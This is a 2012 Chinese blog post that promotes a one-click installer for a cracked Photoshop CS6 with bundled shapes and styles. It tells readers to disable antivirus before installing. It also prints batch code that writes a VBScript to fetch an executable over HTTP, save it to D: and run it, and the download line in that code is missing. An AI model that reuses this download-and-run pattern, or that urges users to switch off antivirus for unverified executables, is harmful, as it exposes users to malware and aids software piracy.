宝文理特别版PS新鲜出炉~

发表于 2012-10-21   |  

平常下载PS都挺慢的。。。这回为了方便大家，我把PS的安装、版本、素材全部整合了。整个套件从下载到安装几乎实现傻瓜化，一键安装式的。想要下载PS的童鞋不妨试试。

首先呢，PS版本是基于汉化破解版的Photoshop CS6，用起来很舒服，功能齐全，文件还小，还不用破解。很不错

本次修改主要实现：

1.将文件放置于服务器上，节省校园带宽，下载速度快。1个PS5分钟即可安装完毕

2.安装傻瓜式，双击安装后，等待下载成功，点击确定即可。

3.PS内置多个素材，其中包括：自定义形状数百个，样式100余套。默认安装后不导入，如需导入，请大家到D:\Program Files\Adobe Photoshop CS6\Adobe Photoshop CS6\Presets文件下导入。需要导入自定义形状请将Custom Shapes文件夹下所有文件拖入PS内，需要导入样式则将Style文件夹下所有文件拖入PS内。

4.本版本长期更新，后期会增加更多内置素材。

安装前请关闭杀毒软件，本版本绝对无毒无后门，本着方便大众的想法做出的。如果不信我可以把源代码贴出，有目共睹：

@echo off
color 0b
echo Set xPost = createObject(“Microsoft.XMLHTTP”) >d:\getps.vbs

echo xPost.Send() >>d:\getps.vbs
echo Set sGet = createObject(“ADODB.Stream”) >>d:\getps.vbs
echo sGet.Mode = 3 >>d:\getps.vbs
echo sGet.Type = 1 >>d:\getps.vbs
echo sGet.Open() >>d:\getps.vbs
echo sGet.Write(xPost.responseBody) >>d:\getps.vbs
echo sGet.SaveToFile “D:\PhotoshopCS6.exe”,2 ‘’’’保存文件的路径和文件名 >>d:\getps.vbs
echo Set ws = createObject(“wscript.shell”) >>d:\getps.vbs
echo ws.run “D:\PhotoshopCS6.exe”, 1, true >>d:\getps.vbs
